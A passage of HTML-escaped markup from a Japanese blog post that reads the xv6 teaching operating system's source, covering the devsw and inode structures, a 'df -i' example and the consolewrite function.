punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;write&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;extern&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;devsw&lt;/span&gt; devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CONSOLE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ちなみに&lt;code class=&quot;language-text&quot;&gt;NDEV&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;param.h&lt;/code&gt;で10と定義されていることがわかります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NDEV&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum major device number&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;devsw構造体について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#devsw%E6%A7%8B%E9%80%A0%E4%BD%93%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;devsw構造体について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;devsw構造体について&lt;/h3&gt;
&lt;p&gt;ここで詳しく知りたいのは、&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体が何者かという点です。&lt;/p&gt;
&lt;p&gt;UNIXのマニュアルなどを見ると、&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体はデバイスドライバが&lt;code class=&quot;language-text&quot;&gt;character device interfaces&lt;/code&gt;を持つ場合に使用されるもののように見えます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://man.netbsd.org/devsw.9&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;devsw(9) - NetBSD Manual Pages&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;また、以下のページのように、「システムが一文字ずつデータを転送する機器に対応」した入出力インターフェースが&lt;code class=&quot;language-text&quot;&gt;character device interfaces&lt;/code&gt;に該当すると考えられます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;デバイスファイル - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ここで&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体の定義を見ると、&lt;code class=&quot;language-text&quot;&gt;read&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;write&lt;/code&gt;の2種類の関数ポインタが設定されています。&lt;/p&gt;
&lt;p&gt;ここには、&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数のように任意の関数割り当てが行われます。&lt;/p&gt;
&lt;p&gt;引数にはいずれも&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;構造体が含まれます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;構造体は、&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体と同様に&lt;code class=&quot;language-text&quot;&gt;file.h&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// in-memory copy of an inode&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  uint dev&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// Device number&lt;/span&gt;
  uint inum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;token comment&quot;&gt;// Inode number&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; ref&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;token comment&quot;&gt;// Reference count&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;sleeplock&lt;/span&gt; lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;token comment&quot;&gt;// protects everything below here&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; valid&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;          &lt;span class=&quot;token comment&quot;&gt;// inode has been read from disk?&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// copy of disk inode&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; major&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; minor&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;short&lt;/span&gt; nlink&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uint addrs&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NDIRECT&lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;inodeとは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#inode%E3%81%A8%E3%81%AF&quot; aria-label=&quot;inodeとは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;inodeとは&lt;/h3&gt;
&lt;p&gt;そもそも&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;とは何かについて触れておきます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;とはざっくり言うとファイル、ディレクトリなどのファイルシステムのオブジェクトに関する情報が格納されている構造体です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;の持つ情報としては以下のようなものが挙げられます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ファイルサイズ(バイト数)&lt;/li&gt;
&lt;li&gt;ファイルを格納しているデバイスのデバイスID&lt;/li&gt;
&lt;li&gt;ファイルの所有者、グループのID&lt;/li&gt;
&lt;li&gt;ファイルシステム内でファイルを識別するinode番号&lt;/li&gt;
&lt;li&gt;タイムスタンプ&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikipedia.org/wiki/Inode&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;inode - Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSの&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;構造体を見ても上記に近い情報が格納されています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;は、システム内に一意のIDで管理されます。(xv6OSでは恐らく&lt;code class=&quot;language-text&quot;&gt;inum&lt;/code&gt;が該当する)&lt;/p&gt;
&lt;p&gt;割り当て可能な&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;番号には通常上限があり、もし&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;番号が枯渇した場合は、ストレージデバイスのディスク容量に空きがあっても新規にファイルの作成ができなくなります。&lt;/p&gt;
&lt;p&gt;一般的なLinuxシステムの場合は、&lt;code class=&quot;language-text&quot;&gt;df -i&lt;/code&gt;コマンドで各デバイスごとの使用可能な&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;の上限を確認できます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ &lt;span class=&quot;token function&quot;&gt;df&lt;/span&gt; -i
Filesystem                         Inodes  IUsed   IFree IUse% Mounted on
udev                              &lt;span class=&quot;token number&quot;&gt;1007124&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;449&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1006675&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /dev
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;919&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1018235&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /run
/dev/mapper/ubuntu--vg-ubuntu--lv &lt;span class=&quot;token number&quot;&gt;1310720&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;380878&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;929842&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;30&lt;/span&gt;% /
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;      &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1019153&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /dev/shm
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;      &lt;span class=&quot;token number&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1019149&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /run/lock
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1019136&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /sys/fs/cgroup
/dev/loop0                             &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;29&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/bare/5
/dev/loop2                          &lt;span class=&quot;token number&quot;&gt;10847&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;10847&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/core18/2284
/dev/loop1                          &lt;span class=&quot;token number&quot;&gt;10836&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;10836&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/core18/2253
/dev/loop3                          &lt;span class=&quot;token number&quot;&gt;11776&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;11776&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/core20/1270
/dev/loop5                          &lt;span class=&quot;token number&quot;&gt;18500&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;18500&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/gnome-3-34-1804/72
/dev/loop4                          &lt;span class=&quot;token number&quot;&gt;11777&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;11777&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/core20/1328
/dev/loop6                          &lt;span class=&quot;token number&quot;&gt;18500&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;18500&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/gnome-3-34-1804/77
/dev/loop7                          &lt;span class=&quot;token number&quot;&gt;65095&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;65095&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/gtk-common-themes/1519
/dev/loop8                            &lt;span class=&quot;token number&quot;&gt;796&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;796&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/lxd/21835
/dev/loop9                          &lt;span class=&quot;token number&quot;&gt;64986&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;64986&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/gtk-common-themes/1515
/dev/loop10                           &lt;span class=&quot;token number&quot;&gt;796&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;796&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/lxd/21545
/dev/loop11                           &lt;span class=&quot;token number&quot;&gt;479&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;479&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/snapd/14295
/dev/loop12                           &lt;span class=&quot;token number&quot;&gt;482&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;482&lt;/span&gt;       &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;% /snap/snapd/14549
/dev/sda2                           &lt;span class=&quot;token number&quot;&gt;65536&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;320&lt;/span&gt;   &lt;span class=&quot;token number&quot;&gt;65216&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /boot
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1019109&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /run/user/121
tmpfs                             &lt;span class=&quot;token number&quot;&gt;1019154&lt;/span&gt;     &lt;span class=&quot;token number&quot;&gt;83&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1019071&lt;/span&gt;    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;% /run/user/1000&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://kazmax.zpp.jp/linux_beginner/inode.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;iノード（inode）とは&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;consolewrite関数を読む&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#consolewrite%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot; aria-label=&quot;consolewrite関数を読む permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;consolewrite関数を読む&lt;/h3&gt;
&lt;p&gt;この時点ではまだ&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;を使ってファイルを作成することはないので、ひとまずxv6OSのコードに戻ります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consolewrite&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;read &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consoleread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;配列の&lt;code class=&quot;language-text&quot;&gt;CONSOLE = 1&lt;/code&gt;要素の&lt;code class=&quot;language-text&quot;&gt;write&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;read&lt;/code&gt;には、それぞれ&lt;code class=&quot;language-text&quot;&gt;console.c&lt;/code&gt;で定義された関数が割り当てされます。&lt;/p&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;consolewrite&lt;/code&gt;関数を読んでみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;consolewrite&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;iunlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;acquire&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;consputc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;buf&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;release&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;ilock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; n&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consolewrite&lt;/code&gt;関数はターゲットとなる&lt;code class=&quot;language-text&quot;&gt;inode&lt;/code&gt;構造体変数のポインタと&lt;code class=&quot;language-text&quot;&gt;consputc&lt;/code&gt;関数に引き渡す文字およびその長さが引数として与えられます。&lt;/p&gt;
&lt;p&gt;まず&lt;code class=&quot;language-text&quot;&gt;iunlock&lt;/code&gt;関数ですが、これは&lt;code class=&quot;language-text&quot;&gt;fs.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// Unlock the given inode.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;iunlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;ip&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ip &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;holdingsleep&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;ip&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; ip&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;ref &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;iunlock&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
